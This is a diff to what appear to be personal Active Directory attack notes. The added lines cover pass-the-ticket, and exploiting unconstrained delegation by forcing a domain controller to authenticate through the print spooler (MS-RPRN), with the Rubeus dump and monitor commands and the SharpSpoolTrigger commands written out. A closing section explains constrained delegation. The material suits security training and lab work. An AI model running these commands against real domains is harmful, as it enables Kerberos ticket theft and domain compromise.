@@ -42,8 +42,22 @@ C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 We can see jdoe's TGT is cached. We can simply extract his TGT and leverage it using pass the ticket attack.
 
 ```powershell
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b5d2 /nowrap
+C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b5d2 /nowrap
 
 woIGwkMuSU92GH23KL....==
 ```
+# Exploiting Unconstrained delegation via forced authentication
+Recently discovered a feature of MS-RPRN which allows any authenticated domain user can force any machine running spooler service to connect to a second machine of the user's choice. We can obtain TGT for machine accounts by forcing them to authenticate to this machine. If unconstrained delegation exists in a machine we can also leverage this to force domain controller to authenticate to this machine to get the TGT of machine account which we can everage via `S4U2Self` abuse. Below we are using Rubeus on app01 to continuously monitor for TGTs
 
+```powershell
+C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
+```
+On any compromised machine we can use SharpSpoolTrigger to force dc.dev.dhitalcorp.local to authenticate to APP01.dev.dhitalcorp.local
+
+```
+C:\Users\Alex> C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc.dev.dhitalcorp.local app01.dev.dhitalcorp.local
+```
+
+
+# Constrained Delegation
+Due to problem in unconstrained delegation and emerging attaks microsoft released constrained delegation instead of a server configured to delegate a user's credentials to any services, in constrained delegation a server is allowed to delegate the user's credential only to a specific server. eg the web server is only allowed to delegate the user's credential to database server. Here the server configured with constrained delegation does not cache a user's TGT in its memory. The server instead uses its own TGT to request for service ticket on behalf of a user.
